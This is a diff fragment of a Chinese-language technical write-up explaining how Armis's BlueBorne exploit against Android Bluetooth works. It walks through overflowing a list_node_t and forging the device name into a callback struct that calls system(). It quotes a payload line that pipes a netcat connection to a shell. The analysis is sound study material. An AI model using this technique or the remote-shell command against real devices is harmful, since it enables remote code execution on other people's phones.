@@ -421,7 +421,7 @@ BSS_ACL_REMOTE_NAME_OFFSET=0xe8556c4b-0xf-0xe835c000
         memcpy((uint8_t*)(p_bcb->p_pending_data + 1), p, rem_len);
 ```
 
-但是具体怎么利用呢？因为堆溢出后面的内容不太可控，所以armis他们就选择了溢出只有8字节大小的list_node_t结构体
+但是具体怎么利用呢？armis他们就选择了溢出只有8字节大小的list_node_t结构体
 
 结构体的定义如下
 ```
@@ -476,8 +476,15 @@ for i in range(1000):
 
 这里armis利用了蓝牙客户端的名字，在蓝牙协议的通信过程中，名字会被存储到so文件的bss段中，位置相对固定
 
-因此可以直接找出来，然后顺便还把注入的命令也放进去了
+因此他们直接将名字伪造成post_to_task_hack_t结构体
 
+```
+((post_to_task_hack_t*)(&p_msg->data[0]))->callback(p_msg)
+```
+然后这里callback的参数刚好就是结构体本身，也就是名字，因此可以把callback函数设置为system，在名字后面加上分号和需要执行的命令，最后就能成功执行
+
+
+下面这里是改名字相关的代码，可以参考一下他们具体是把名字改成怎样的
 
 ```
 SHELL_SCRIPT = b'toybox nc {ip} {port} | sh'
